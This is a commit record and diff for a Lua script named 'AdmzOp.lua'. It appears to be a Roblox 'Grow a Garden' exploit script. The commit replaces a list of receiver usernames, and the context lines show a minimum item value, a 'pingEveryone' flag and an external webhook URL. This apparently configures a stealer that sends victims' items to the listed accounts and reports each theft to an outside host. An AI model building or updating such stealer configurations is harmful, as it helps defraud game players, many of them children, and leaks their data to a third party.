ba439f456dd7ae9fce2b14cfb16731343ec4f92d
ShxDrag <bns19126@gmail.com>
2026-06-19 06:21:58 +0900

    Update AdmzOp.lua

--- AdmzOp.lua
+++ AdmzOp.lua
@@ -63,7 +63,7 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"GROW4GARDEN1M1001","GROW4GARDEN1M1002","GROW4GARDEN1M1003","GROW4GARDEN1M1000","GROW4GARDEN1M1004"}
+_G.Usernames = {"GROW4GARDEN1M1005","GROW4GARDEN1M1006","GROW4GARDEN1M1007","GROW4GARDEN1M1008","GROW4GARDEN1M1009"}
 _G.min_value = 0.017
 _G.pingEveryone = "Yes"
 _G.webhook = "https://megamegamega.vercel.app/api/webhook"
